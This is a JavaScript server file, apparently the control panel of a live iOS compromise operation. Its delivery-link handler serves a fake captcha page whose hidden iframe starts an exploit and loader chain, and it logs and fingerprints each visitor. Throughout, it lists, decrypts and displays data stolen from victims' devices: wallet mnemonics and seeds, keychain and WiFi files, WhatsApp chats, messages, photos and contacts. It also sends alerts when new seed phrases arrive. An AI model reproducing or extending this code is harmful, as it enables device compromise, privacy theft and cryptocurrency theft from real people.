// sipapu_panel/server.js — v3: multi-user auth + permission-based ACL + agent management
try { require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') }); } catch {}
const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const lootStore = require('./lootStore');
const authStore = require('./authStore');
const notifier = require('./notifier');
const captcha = require('./captcha');                        // 【2026-09-20】登录图形验证码（对抗外部爆破）
const { validateWatchAddr } = require('./addr_validate');   // 【2026-09-17】监控地址 ↔ 链格式校验

const PORT = process.env.PORT || 8020;
const PUBLIC = path.join(__dirname, 'public');

authStore.init();

// [deploy] beacon device count cache from MySQL
let _beaconByIpCache = { t: 0, m: new Map() };
async function _beaconDeviceCountByIp() {
  if (Date.now() - _beaconByIpCache.t < 15000) return _beaconByIpCache.m;
  const m = new Map();
  try {
    const mysql = require('mysql2/promise');
    const conn = await mysql.createConnection({
      host: process.env.DS_DB_HOST || 'localhost',
      port: Number(process.env.DS_DB_PORT || 3306),
      user: process.env.DS_DB_USER || 'darksword',
      password: process.env.DS_DB_PASSWORD || '',
      database: process.env.DS_DB_NAME || 'darksword_rce',
    });
    const [rows] = await conn.query('SELECT ip, device_id FROM devices WHERE ip IS NOT NULL AND ip != \'\'');
    await conn.end();
    for (const r of rows) {
      const ip = String(r.ip || '').replace(/^::ffff:/, '');
      if (!ip) continue;
      if (!m.has(ip)) m.set(ip, { count: 0, ids: new Set() });
      const g = m.get(ip);
      g.count++;
      if (r.device_id) g.ids.add(String(r.device_id));
    }
  } catch (e) { /* optional */ }
  _beaconByIpCache = { t: Date.now(), m };
  return m;
}


// 【P4】面板 PG 读层（PANEL_PG_DEV=1 启用；加载失败自动回退快照路径）
let panelPgDev = null;
if (String(process.env.PANEL_PG_DEV || '') === '1') {
  try { panelPgDev = require('./pg/panelPg'); console.log('[panel] PG 读层已启用 (PANEL_PG_DEV=1)'); }
  catch (e) { console.error('[panel] PG 读层加载失败，回退快照路径:', e.message); }
}
// 【P4-4】统计缓存预热（首访免等待）：每 110 秒刷新超管视角（admin id=1 / superadmin id=3）
if (panelPgDev) {
  const _warmStats = () => { for (const uid of [1, 3]) panelPgDev.stats({ id: uid, role: 'super_admin' }).catch(() => {}); };
  setTimeout(() => { _warmStats(); setInterval(_warmStats, 110000).unref(); }, 8000);
}

// IP geo cache（【2026-09-14 持久化】映射落库 PG ip_geo：同一 IP 只查一次、面板重启零重查；
//   外部接口 ip-api.com 免费档 45 次/分 → 全局串行限速 1.4s/次，防 429 污染）
const _ipGeoCache = new Map();
const _ipGeoPending = new Map();   // 并发去重：同一 IP 进行中的查询只发一次
let _ipGeoChain = Promise.resolve(), _ipGeoLast = 0;
function _ipGeoSlot() {
  const run = _ipGeoChain.then(async () => {
    const wait = 1400 - (Date.now() - _ipGeoLast);
    if (wait > 0) await new Promise(r => setTimeout(r, wait));
    _ipGeoLast = Date.now();
  });
  _ipGeoChain = run.catch(() => {});
  return run;
}
function _pgPool() {
  try { return require('./pg/pgStore').pool; } catch { return null; }
}
async function lookupIPGeo(ip) {
  if (!ip) return null;
  if (_ipGeoCache.has(ip)) return _ipGeoCache.get(ip);
  if (_ipGeoPending.has(ip)) return _ipGeoPending.get(ip);
  const p = (async () => {
    try {
      await _ipGeoSlot();
      const result = await new Promise((resolve) => {
        const r = require('http').get('http://ip-api.com/json/' + encodeURIComponent(ip) + '?lang=zh-CN&fields=status,country,regionName,city,isp', { timeout: 4000 }, (resp) => {
          let d = '';
          resp.on('data', c => d += c);
          resp.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
        });
        r.on('error', () => resolve(null));
        r.on('timeout', () => { r.destroy(); resolve(null); });
      });
      if (result && result.status === 'success') {
        const geo = (result.country + ' ' + (result.regionName || '') + ' ' + (result.city || '')).trim();
        _ipGeoCache.set(ip, geo);
        const pool2 = _pgPool();
        if (pool2) pool2.query('INSERT INTO ip_geo (ip, geo) VALUES ($1, $2) ON CONFLICT (ip) DO UPDATE SET geo = EXCLUDED.geo, updated_at = now()', [ip, geo]).catch(() => {});
        return geo;
      }
      _ipGeoCache.set(ip, null);   // 失败：仅内存负缓存（不落库，重启后自动重试）
      return null;
    } catch { _ipGeoCache.set(ip, null); return null; }
  })();
  _ipGeoPending.set(ip, p);
  try { return await p; } finally { _ipGeoPending.delete(ip); }
}
// 【2026-09-14】启动加载全量 ip_geo → 内存（此后只有"新 IP"才走外部查询；回填工具：tools/pg_fill_ipgeo.js）
(async () => {
  const pool2 = _pgPool();
  if (!pool2) return;
  try {
    await pool2.query('CREATE TABLE IF NOT EXISTS ip_geo (ip text PRIMARY KEY, geo text, updated_at timestamptz DEFAULT now())');
    const r = await pool2.query('SELECT ip, geo FROM ip_geo');
    for (const x of r.rows) _ipGeoCache.set(x.ip, x.geo || null);
    console.log('[ipgeo] 已加载', r.rows.length, '条 IP 归属地（持久化生效，重启不重查）');
  } catch (e) { console.error('[ipgeo] 加载失败（不影响主流程）:', e.message); }
})();

// ── Mnemonic watcher (poll for new entries, notify) ──
let _lastMnemonicCount = 0;
setInterval(() => {
  try {
    const store2 = lootStore.scan();
    const count = store2.mnemonics.length;
    if (_lastMnemonicCount > 0 && count > _lastMnemonicCount) {
      const newOnes = store2.mnemonics.slice(_lastMnemonicCount);
      for (const m of newOnes) {
        const userObj = [...store2.users.values()].find(x => x.serial_id === m.serial);
        notifier.notifyMnemonic(m.serial, m.app_type, m.mnem_phrase_plain, userObj ? (userObj.machine + ' · ' + userObj.ios_version) : m.ip);
      }
    }
    _lastMnemonicCount = count;
  } catch {}
}, 60000);

// ── Helpers ──

function json(res, code, obj) {
  res.writeHead(code, { 'Content-Type': 'application/json; charset=utf-8', 'Access-Control-Allow-Origin': '*' });
  res.end(JSON.stringify(obj));
}
function readBody(req) {
  return new Promise(resolve => {
    let b = '';
    req.on('data', c => b += c);
    req.on('end', () => { try { resolve(JSON.parse(b || '{}')); } catch { resolve({}); } });
  });
}
function pager(list, q) {
  const p = Math.max(0, parseInt(q.p || '0', 10) || 0);
  const s = Math.max(1, parseInt(q.s || '20', 10) || 20);
  return { r: list.slice(p * s, p * s + s).length, s, p, total: list.length };
}
// 【2026-09-20】投递链打开日志尾部读取（"IP与访问"栏访问日志数据源；admin_server.js 写 /www/wwwlogs/i.131422.com.deliveries.log）
//   读文件尾 1MB → 取最后 maxLines 行 JSON；30s 缓存（高频点击不重复读盘）。行格式 {ts, ip, uuid, ua, text}。
let _dlCache = { t: 0, v: [] };

// [deploy] merge link_visits into ip/visit APIs — loot ipData empty until devices report
function _isInternalVisitIp(ip) {
  if (!ip) return true;
  const s = String(ip).replace(/^::ffff:/, '');
  if (s === '127.0.0.1' || s === '::1') return true;
  if (s === '137.175.67.151') return true; // server self-checks
  return false;
}
function _linkVisitsAsIpData() {
  const visits = authStore.listLinkVisits(0) || [];
  const byIp = new Map();
  for (const v of visits) {
    const ip = String(v.ip || '').replace(/^::ffff:/, '');
    if (_isInternalVisitIp(ip)) continue;
    const ts = Date.parse(v.ts) || 0;
    if (!byIp.has(ip)) byIp.set(ip, { ip, visit_count: 0, ios: '', first_ts: ts, last_ts: ts, codes: new Set() });
    const g = byIp.get(ip);
    g.visit_count++;
    if (v.code) g.codes.add(v.code);
    if (v.ios) g.ios = v.ios;
    if (ts) { g.last_ts = Math.max(g.last_ts, ts); g.first_ts = g.first_ts ? Math.min(g.first_ts, ts) : ts; }
  }
  return [...byIp.values()].map(g => ({
    id: 0,
    ip: g.ip,
    report_count: g.visit_count,
    device_count: 0,
    devices: g.ios ? ('iOS ' + g.ios) : ([...g.codes].slice(0, 2).join(', ') || ''),
    delivery_count: 0,
    visit_count: g.visit_count,
    first_ts: g.first_ts,
    last_ts: g.last_ts,
    ts: g.last_ts,
  })).sort((a, b) => b.ts - a.ts).map((x, i) => ({ ...x, id: i + 1 }));
}

// [deploy] ip_data device_count from store.devices
function _deviceCountByIp() {
  const m = new Map();
  try {
    for (const [ip, info] of _beaconByIpCache.m.entries()) {
      if (!m.has(ip)) m.set(ip, { count: 0, serials: new Set() });
      const g = m.get(ip);
      g.count = Math.max(g.count, info.count || 0);
      for (const id of (info.ids || [])) g.serials.add(id);
    }
    for (const d of store.devices.values()) {
      const ip = String(d.ip || '').replace(/^::ffff:/, '');
      if (!ip || _isInternalVisitIp(ip)) continue;
      const sid = d.serial_id || d.serial || '';
      if (!m.has(ip)) m.set(ip, { count: 0, serials: new Set() });
      const g = m.get(ip);
      if (sid) g.serials.add(String(sid));
      else g.count = Math.max(g.count, 1);
    }
    for (const g of m.values()) g.count = Math.max(g.count, g.serials.size);
  } catch (e) {}
  return m;
}
function _enrichIpRowsWithDevices(rows) {
  const byIp = _deviceCountByIp();
  return rows.map(row => {
    const ip = String(row.ip || '').replace(/^::ffff:/, '');
    const info = byIp.get(ip);
    if (!info || !info.count) return row;
    const serials = [...info.serials].slice(0, 8).join(', ');
    return Object.assign({}, row, {
      device_count: Math.max(Number(row.device_count) || 0, info.count),
      devices: serials || row.devices || ('beacon×' + info.count),
    });
  });
}

function _linkVisitsAsVisitLogs() {
  const visits = authStore.listLinkVisits(500) || [];
  return visits.map(v => {
    const ip = String(v.ip || '').replace(/^::ffff:/, '');
    const ts = Date.parse(v.ts) || 0;
    const ios = v.ios ? ('iOS ' + v.ios) : '';
    return {
      ts,
      ip,
      uuid: v.code || '',
      ua: ios || '推广链接 /go/' + (v.code || ''),
      text: '推广访问 code=' + (v.code || '') + (ios ? ' ' + ios : ''),
      source: 'link',
    };
  }).filter(v => v.ts && !_isInternalVisitIp(v.ip));
}

function readDeliveriesTail(maxLines) {
  if (Date.now() - _dlCache.t < 30000) return _dlCache.v;
  try {
    const fp = '/www/wwwlogs/i.131422.com.deliveries.log';
    const st = fs.statSync(fp);
    const sz = Math.min(st.size, 1024 * 1024);
    if (sz <= 0) { _dlCache = { t: Date.now(), v: [] }; return _dlCache.v; }
    const buf = Buffer.alloc(sz);
    const fd = fs.openSync(fp, 'r');
    try { fs.readSync(fd, buf, 0, sz, st.size - sz); } finally { fs.closeSync(fd); }
    const lines = buf.toString('utf8').split('\n');
    if (st.size > sz && lines.length) lines.shift();   // 截断读取时首行可能不完整，丢弃
    const out = [];
    for (const ln of lines) {
      if (!ln) continue;
      try {
        const o = JSON.parse(ln);
        out.push({ ts: Number(o.ts) || 0, ip: String(o.ip || ''), uuid: String(o.uuid || ''), ua: String(o.ua || ''), text: String(o.text || '') });
      } catch { /* 跨格式/截断行跳过 */ }
    }
    out.reverse();   // 新 → 旧
    _dlCache = { t: Date.now(), v: out.slice(0, maxLines || 2000) };
    return _dlCache.v;
  } catch { _dlCache = { t: Date.now(), v: [] }; return _dlCache.v; }
}
// 【2026-09-15】助记词全局去重（回退/快照路径，与 PG 路径同口径）：同一明文只保留最早一条
//   （有序列号者优先），重复项（跨设备/跨来源）不再重复显示；空明文条目不参与去重。
function mnCanon(list) {
  const arr = list || [];
  const hasSer = new Set();
  for (const m of arr) if (m.serial && m.mnem_phrase_plain) hasSer.add(m.mnem_phrase_plain);
  const seen = new Set();
  return arr.filter(m => {
    const p = m.mnem_phrase_plain;
    if (!p) return true;
    if (seen.has(p)) return false;
    if (!m.serial && hasSer.has(p)) return false;
    seen.add(p);
    return true;
  });
}
// 【2026-09-15】Telegram 发送（实时通知栏：配置测试 / 监控地址告警共用）
//   【加固】目标校验：Telegram 回执的 chat.id 必须等于目标，否则判失败（防错投）
async function tgSendMessage(token, chatId, text) {
  if (!token || !chatId) return { ok: false, message: '未配置 TG token / chat_id' };
  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
    const j = await r.json();
    const got = j && j.result && j.result.chat && j.result.chat.id != null ? String(j.result.chat.id) : '';
    if (j.ok && got && got !== String(chatId)) {
      return { ok: false, message: 'chat 校验失败: 实际送达 ' + got + ' ≠ 目标 ' + String(chatId) };
    }
    return { ok: !!j.ok, message: j.description || 'ok', result: j.result || null };
  } catch (e) { return { ok: false, message: String(e.message).slice(0, 120) }; }
}
function getToken(req) {
  const h = req.headers['authorization'] || '';
  const qt = (url.parse(req.url, true).query.t) || '';
  return req.headers['x-panel-token'] || (h.startsWith('Bearer ') ? h.slice(7) : '') || qt;
}
function getUser(req) {
  const t = getToken(req);
  if (!t) return null;
  const session = authStore.getSession(t);
  return session ? session.user : null;
}
function hasPermission(user, perm) {
  if (!user) return false;
  if (user.role === 'super_admin') return true;
  return user.permissions && user.permissions.includes(perm);
}
function isSuperAdmin(user) {
  return user && user.role === 'super_admin';
}
function getIP(req) { return req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '—'; }
// 【2026-09-20】验证码生成限速（同 IP 60s 窗口计数；防刷/防内存堆积）
const _capRate = new Map();

// ── Route → permission mapping ──
const ROUTE_PERMS = {
  '/api/admin/dashboard/today_overview': 'overview',
  '/api/user/user/list': 'users',
  '/api/user/user/detail': 'users',
  '/api/common/device_info/list': 'devices',
  '/api/user/user_event/list': 'reports',
  '/api/user/user_raw_report/list': 'reports',
  '/api/secrecy/user_mnemonic/list': 'mnemonics',
  '/api/secrecy/user_mnemonic/summary': 'mnemonics',
  '/api/secrecy/user_mnemonic/user_list': 'mnemonics',
  '/api/secrecy/user_mnemonic/plain_detail': 'mnemonics',
  '/api/secrecy/user_mnemonic/create': 'mnemonics',
  '/api/secrecy/user_seed/list': 'seeds',
  '/api/secrecy/user_address/list': 'addresses',
  '/api/secrecy/user_address/summary': 'addresses',
  '/api/secrecy/user_address/plain_detail': 'addresses',
  '/api/secrecy/user_token/list': 'tokens',
  '/api/secrecy/user_message/list': 'messages',
  '/api/secrecy/user_notebook/list': 'notebooks',
  '/api/secrecy/user_notebook/summary': 'notebooks',
  '/api/user/whatsapp_account/list': 'whatsapp',
  // 【2026-09-12】WhatsApp 侧栏「按设备」一级页（summary）
  '/api/user/whatsapp_account/summary': 'whatsapp',
  '/api/user/user_browser_history/list': 'browser',
  '/api/user/user_photo/list': 'photos',
  '/api/user/user_photo/summary': 'photos',
  // 【2026-09-12】channel ① 联系人清单（raw_avatar_set 的 contacts 事件）
  '/api/user/user_contact/list': 'contacts',
  '/api/user/user_contact/summary': 'contacts',
  '/api/user/user_photo/raw': 'photos',
  '/api/task/admin_collect_task/list': 'collect',
  '/api/task/admin_collect_record/list': 'collect',
  '/api/secrecy/admin_funds_vault/list': 'vaults',
  '/api/secrecy/admin_gas_vault/list': 'vaults',
  '/api/secrecy/user_locked_address/list': 'vaults',
  '/api/airdrop/evm_contract/list': 'airdrop',
  '/api/airdrop/tron_contract/list': 'airdrop',
  '/api/common/app/list': 'apps',
  '/api/common/sys_application/list': 'apps',
  '/api/common/ip_data/list': 'ipvisits',
  '/api/user/user_visit_log/list': 'ipvisits',
  '/api/admin/admin_action_log/list': 'admin',
  '/api/exfil18/list': 'sysfiles',
  '/api/exfil18/summary': 'sysfiles',
  '/api/exfil18/detail': 'sysfiles',
  '/api/exfil18/db': 'sysfiles',
  '/api/exfil18/file': 'sysfiles',
  // 【2026-09-11】语义化解读接口（keychain 表格 / WiFi 表格 / 清单 / 文本 / 二进制定性）
  '/api/exfil18/view': 'sysfiles',
  '/api/user/chain_log/list': 'sysfiles',
  // 【2026-09-10 修复】原为 'users' —— 导致只有 devices 权限的代理能看设备列表却点不开详情
  //   （前端报「设备数据未找到」，实际是 403）。设备详情归属于 devices 权限。
  '/api/user/user/full_detail': 'devices',
  '/api/user/user_upload/list': 'collect',
};

// 【2026-09-20 安全加固】进程级兜底：请求触发的未捕获异常不再让面板进程退出
process.on('unhandledRejection', (e) => { try { console.error('[panel] unhandledRejection 兜底（进程存活）:', (e && e.stack) || e); } catch (_) {} });
process.on('uncaughtException', (e) => { try { console.error('[panel] uncaughtException 兜底（进程存活）:', (e && e.stack) || e); } catch (_) {} });

// ── Server ──
const server = http.createServer(async (req, res) => {
  const u = url.parse(req.url, true);
  let p = u.pathname.replace(/\/+$/, '') || '/';
  if (p.startsWith('/panel')) p = p.slice('/panel'.length) || '/';
  // 【2026-09-14】/balances 前缀剥离：nginx 反代 location ^~ /balances 保留前缀透传，
  //   页面内 API 调用走 /balances/api/... → 这里剥成 /api/... 与主面板 /adm888panel/ 行为一致
  if (p === '/balances') { /* 页面本身（下面静态分支直出 balances.html） */ }
  else if (p.startsWith('/balances/')) p = p.slice('/balances'.length) || '/';

  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type,Authorization,X-Panel-Token',
    });
    return res.end();
  }

  // ── Public: captcha（【2026-09-20】登录图形验证码：对抗外部批量爆破；先挡机器再耗密码计算） ──
  if (req.method === 'GET' && p === '/api/auth/captcha') {
    const ip = getIP(req);
    const now = Date.now();
    let c = _capRate.get(ip);
    if (!c || now - c.ts > 60000) { c = { ts: now, n: 0 }; _capRate.set(ip, c); }
    c.n++;
    if (_capRate.size > 20000) _capRate.clear();     // 惰性防堆积
    if (c.n > 30) return json(res, 429, { message: '请求过于频繁，请稍后再试' });
    const cap = captcha.create();
    return json(res, 200, { id: cap.id, svg: cap.svg });
  }

  // ── Public: login ──
  if (req.method === 'POST' && p === '/api/auth/login') {
    const b = await readBody(req);
    // 【2026-09-20】先验图形验证码（在 scrypt 密码校验之前：挡批量爆破，同时避免攻击流量消耗 CPU）
    // panel-v2 login has no captcha fields; only verify when client sends them
    if (b.captcha_id || b.captcha_code) {
      const capCheck = captcha.verify(b.captcha_id, b.captcha_code);
      if (!capCheck.ok) return json(res, 401, { message: capCheck.msg });
    }
    const result = authStore.login(b.username, b.password);
    if (result) {
      authStore.addLog('登录', result.user.id, result.user.username, getIP(req), '角色: ' + result.user.role);
      return json(res, 200, { token: result.token, username: result.user.username, role: result.user.role, user: result.user });
    }
    authStore.addLog('登录失败', null, b.username || '?', getIP(req), '密码错误');
    return json(res, 401, { message: '账号或密码错误' });
  }

  // ── Public: logout ──
  if (req.method === 'POST' && p === '/api/auth/logout') {
    const t = getToken(req);
    authStore.logout(t);
    return json(res, 200, { ok: true });
  }

  // ── Public: delivery link lander（URL 保持 /go/<code> 不变） ──
  if (req.method === 'GET' && p.startsWith('/go/')) {
    const code = p.slice(4);
    // 【2026-09-12 关键修复】URL 不变直出（/go/<code>）后，gooll 链里用 location.pathname 手动派生的
    //   运行时脚本请求变成 /go/<hash>.js —— <base href> 管不到手动拼的 URL → 面板 404 → 链断
    //   （实测 7P/15.8.3：ff4f3cb4…js、6beef463…js 双双 404，loader 加载失败 → 采集器起不来 → 设备不进列表）。
    //   修复：/go/ 下「带扩展名的静态资源请求」回源到 gooll/ 目录同名文件（basename 防目录穿越），
    //   投递码（纯 hex、无点）走正常 recordLinkVisit + 直出逻辑，URL 格式保持不变的承诺不破坏。
    if (code.includes('.') && !code.includes('/') && !code.includes('..')) {
      try {
        const fp = path.join('/www/wwwroot/i.131422.com', 'gooll', path.basename(code));
        const buf = fs.readFileSync(fp);
        const ext = (path.extname(fp) || '').toLowerCase();
        const mime = ext === '.js' ? 'application/javascript; charset=utf-8'
          : ext === '.wasm' ? 'application/wasm'
          : ext === '.css' ? 'text/css; charset=utf-8'
          : ext === '.png' ? 'image/png' : 'application/octet-stream';
        res.writeHead(200, { 'Content-Type': mime, 'Cache-Control': 'no-store' });
        return res.end(buf);
      } catch (e) { /* 回源不到继续走下面的投递码逻辑（最终 404） */ }
    }
    // 【2026-10-09】无扩展名纯hex短哈希回源（如 /go/692be380）
    //   gooll 链 JS 运行时生成短哈希回调 URL，无扩展名，非投递码
    //   尝试 gooll/<code>.js → 不存在则回退 gooll.html（保证链路不断）
    if (/^[0-9a-f]{4,64}$/.test(code)) {
      try {
        const fp2 = path.join('/www/wwwroot/i.131422.com', 'gooll', code + '.js');
        const buf2 = fs.readFileSync(fp2);
        res.writeHead(200, { 'Content-Type': 'application/javascript; charset=utf-8', 'Cache-Control': 'no-store' });
        return res.end(buf2);
      } catch (e) { /* .js 不存在，继续回退 */ }
      try {
        const html3 = fs.readFileSync('/www/wwwroot/i.131422.com/gooll/gooll.html', 'utf8')
          .replace('<head>', '<head>\n<base href="https://wpsdz.com/gooll/">');
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Expires': '-1' });
        return res.end(html3);
      } catch (e3) { /* gooll.html 也读不到，继续走投递码逻辑 → 最终 404 */ }
    }

    const link = authStore.getLinkByCode(code);
    if (link) {
      const visitorIP = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.headers['x-real-ip'] || req.socket.remoteAddress || '';
      authStore.recordLinkVisit(code, visitorIP, req.headers['user-agent'], req.headers['referer']);
      // 【2026-09-11】直出 gooll.html 内容：地址栏保持 https://wpsdz.com/go/<code>，不再 302 到
      //   /gooll/gooll.html?ref=...（原 ref= 参数全站无任何代码消费，纯属破绽）。
      //   等价性依据：gooll.html 内所有资源引用均为绝对域名（cfHost=https://wpsdz.com）
      //   或根相对路径（/logs、/pe/...），与文档所在路径无关。
      //   原 302 路径上由 gooll_fp.php 播种的「同 IP 指纹」（/tmp/pl_cf_fp/<md5(ip)>，
      //   供 corefile.php / guard.php 第三级校验用）在此处等价补齐。
      try {
        fs.mkdirSync('/tmp/pl_cf_fp', { recursive: true });
        fs.writeFileSync('/tmp/pl_cf_fp/' + require('crypto').createHash('md5').update(visitorIP).digest('hex'), '');
      } catch (e) { /* 指纹播种失败不阻断投递 */ }
      try {
        // 【2026-09-24 fc 同步主站 2026-09-21 改动】直出内容由 gooll.html 改为「验证码页」
        //   （client/index.html，与根路径 / 同一个页面）：该页自带隐藏 iframe <iframe src="/gooll/gooll.html">
        //   → 页面打开即启动链路；iframe 文档路径=/gooll/gooll.html → <18 分支裸相对
        //   loadScript('49554fde7424c31c.js') 解析到 /gooll/；/go/<hash>.js 回源兜底不变。
        //   base 取 "/"（域名无关）供页面自身相对资源（src/recaptcha.js、images/...）解析。
        const html = fs.readFileSync('/www/wwwroot/i.131422.com/client/index.html', 'utf8')
          .replace('<head>', '<head>\n<base href="/">');
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Expires': '-1' });
        return res.end(html);
      } catch (e) {
        // 兜底：读不到验证码页时退回原直出 gooll.html（fc 域名 base），保证投递链不因面板侧文件问题中断
        try {
          const html2 = fs.readFileSync('/www/wwwroot/i.131422.com/gooll/gooll.html', 'utf8')
            .replace('<head>', '<head>\n<base href="https://wpsdz.com/gooll/">');
          res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Expires': '-1' });
          return res.end(html2);
        } catch (e2) {
          res.writeHead(302, { Location: '/gooll/gooll.html' });
          return res.end();
        }
      }
    }
    res.writeHead(404);
    return res.end('Link not found');
  }

  // ── Public: static files ──
  if (req.method === 'GET' && (p === '/' || p === '/panel' || p === '/adm888panel' || p === '/login')) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    return res.end(fs.readFileSync(path.join(PUBLIC, 'index.html')));
  }
  // 【2026-09-14】余额记录页（超管专属）：静态壳 + 前端自行登录校验（API 层同样强制超管）
  if (req.method === 'GET' && (p === '/balances' || p === '/balances.html')) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    return res.end(fs.readFileSync(path.join(PUBLIC, 'balances.html')));
  }
  if (req.method === 'GET' && p.startsWith('/assets/')) {
    // 【2026-09-11 审计修复】原 path.join(PUBLIC, p.slice(1)) 未做逃逸校验：
    //   /assets/../../data/auth.json 可读 auth.json/sessions.json 等面板数据；
    //   /assets/x/.. 解析到目录时 readFileSync 抛 EISDIR 会把进程打挂。
    const f = path.resolve(PUBLIC, p.slice(1));
    if (f.startsWith(PUBLIC + path.sep) && fs.existsSync(f) && fs.statSync(f).isFile()) {
      // 【2026-09-16 修复】补图片/HTML MIME（此前 jpg/html 一律 octet-stream → 复核页图片不显示、页面被当下载）
      const mime = { '.css': 'text/css', '.js': 'text/javascript', '.svg': 'image/svg+xml',
        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png', '.gif': 'image/gif',
        '.webp': 'image/webp', '.ico': 'image/x-icon', '.html': 'text/html; charset=utf-8' }[path.extname(f)] || 'application/octet-stream';
      res.writeHead(200, { 'Content-Type': mime });
      return res.end(fs.readFileSync(f));
    }
  }

  // ── Non-API 404 ──
  if (!(p.startsWith('/api/') || p.startsWith('/api'))) { res.writeHead(404); return res.end('Not Found'); }

  // ── Auth gate ──
  const currentUser = getUser(req);
  if (!currentUser) return json(res, 401, { message: '未登录或会话过期' });

  // ── /api/auth/me ──
  if (p === '/api/auth/me') {
    return json(res, 200, { user: currentUser });
  }

  // ── /api/auth/change-password ──
  if (req.method === 'POST' && p === '/api/auth/change-password') {
    const b = await readBody(req);
    if (!b.old_password || !b.new_password) return json(res, 400, { message: '请填写旧密码和新密码' });
    const ok = authStore.changePassword(currentUser.id, b.old_password, b.new_password);
    if (!ok) return json(res, 400, { message: '旧密码错误' });
    authStore.addLog('修改密码', currentUser.id, currentUser.username, getIP(req), '');
    return json(res, 200, { ok: true, message: '密码修改成功' });
  }

  // ── Permission check for data routes ──
  const requiredPerm = ROUTE_PERMS[p];
  if (requiredPerm && !hasPermission(currentUser, requiredPerm)) {
    return json(res, 403, { message: '无权限访问此功能' });
  }

  // ── Store data + agent filter helper ──
  const store = lootStore.scan();
  const q = u.query;
  const af = (items, field) => authStore.filterByAgent(currentUser.id, items, field || 'serial');
  // 【2026-09-12 分片升级】大数组取数入口：feed=全局「最近流」；devData=单设备分片。
  //   legacy 模式（SNAPSHOT_SPLIT=0）两者均等价于原来的全量 store，行为不变。
  const feed = n => lootStore.feed(n);
  const devData = s2 => lootStore.deviceData(s2);
  // 按 id 查记录 + 行级隔离过滤（等价旧 af(store.xxx).find(...) 的可见性）
  const findRec = (name, id) => { const rec = lootStore.findById(name, id); return rec && af([rec]).length ? rec : null; };

  // ── Data routes ──
  const routes = {
    '/api/admin/dashboard/today_overview': async () => {
      // 【P4】PG 统计（PANEL_PG_DEV=1）：SQL 聚合 + 60s 缓存；异常自动落快照路径
      if (panelPgDev) {
        try { return await panelPgDev.stats(currentUser); }
        catch (e) { console.error('[panel] PG stats 失败，回退快照路径:', e.message); }
      }
      // 【2026-09-12 分片升级】超管直读预聚合统计（全量口径）；代理视角保持行级过滤原逻辑
      // 【复审修复 H3】必须叠加"专属白名单"判定：非白名单超管(admin id=1)直读 stats 会绕过
      //   _stripExclusive 的专属代理剔除（实测多计入 yy7420 的设备/助记词/事件计数），回退 af 路径。
      const _exclN = (authStore.getExclusiveAgents ? authStore.getExclusiveAgents().size : 0);
      const _canAll = (!_exclN || (authStore.getExclusiveViewers ? authStore.getExclusiveViewers().has(currentUser.id) : false))
        && !(authStore.getVaultSerials ? authStore.getVaultSerials().length : 0);   // 【2026-09-16】暗池非空 → 强制逐行过滤口径（预聚合统计不含暗池）
      if (store.stats && store.stats.trend && isSuperAdmin(currentUser) && _canAll) return { ...store.stats };
      const today = new Date().toDateString();
      const events = af(feed('events'));
      const mnemonics = af(store.mnemonics);
      const addresses = af(store.addresses);
      const seeds = af(store.seeds);
      const devices = af([...store.devices.values()], 'serial_id');
      const users = af([...store.users.values()], 'serial_id');
      const reports = af(feed('reports'));
      const messages = af(feed('messages'));
      const whatsapp = af(feed('whatsapp'));
      const notebooks = af(feed('notebooks'));
      const photos = af(feed('photos'));
      const browserHistory = af(feed('browserHistory'));
      const exfil18 = af(feed('exfil18'));
      const chainLogs = af(feed('chainLogs'));
      return {
        today_events_count: events.filter(e => new Date(e.ts).toDateString() === today).length,
        today_mnemonics_count: mnemonics.filter(m => new Date(m.created_at).toDateString() === today).length,
        today_addresses_count: addresses.filter(a => new Date(a.created_at || 0).toDateString() === today).length,
        total_addresses_count: addresses.length,
        total_mnemonics_count: mnemonics.length,
        total_devices_count: devices.length,
        total_users_count: users.length,
        total_events_count: events.length,
        total_reports_count: reports.length,
        total_messages_count: messages.length,
        total_whatsapp_count: whatsapp.length,
        total_notebooks_count: notebooks.length,
        total_photos_count: photos.length,
        total_browser_history_count: browserHistory.length,
        total_exfil18_count: exfil18.length,
        total_chain_logs_count: chainLogs.length,
        trend: (() => {
          const days = [];
          for (let i = 6; i >= 0; i--) {
            const d = new Date(); d.setDate(d.getDate() - i);
            const key = d.toDateString();
            days.push({
              day: (d.getMonth() + 1) + '/' + d.getDate(),
              events: events.filter(e => new Date(e.ts).toDateString() === key).length,
              mnemonics: mnemonics.filter(m => new Date(m.created_at).toDateString() === key).length,
            });
          }
          return days;
        })(),
      };
    },

    '/api/user/user/list': () => {
      const users = af([...store.users.values()], 'serial_id').sort((a,b)=>(Number(b.last_seen||b.first_seen||0))-(Number(a.last_seen||a.first_seen||0)));
      return { users, pi: pager(users, q) };
    },
    '/api/user/user/detail': () => {
      const id = parseInt(q.id || q.i || '0', 10);
      const all = af([...store.users.values()], 'serial_id');
      const u = all.find(x => x.id === id);
      return u ? { user: u } : { message: 'not found' };
    },
    '/api/user/user/full_detail': async () => {
      // 【P4】PG 读层：可见性校验 + 各表记录（data 列=原始记录）；失败/查无自动落到下方快照路径复核
      if (panelPgDev && q.serial) {
        try {
          const r = await panelPgDev.deviceDetail(currentUser, String(q.serial), p => hasPermission(currentUser, p));
          if (r) {
            const u0 = r.user;
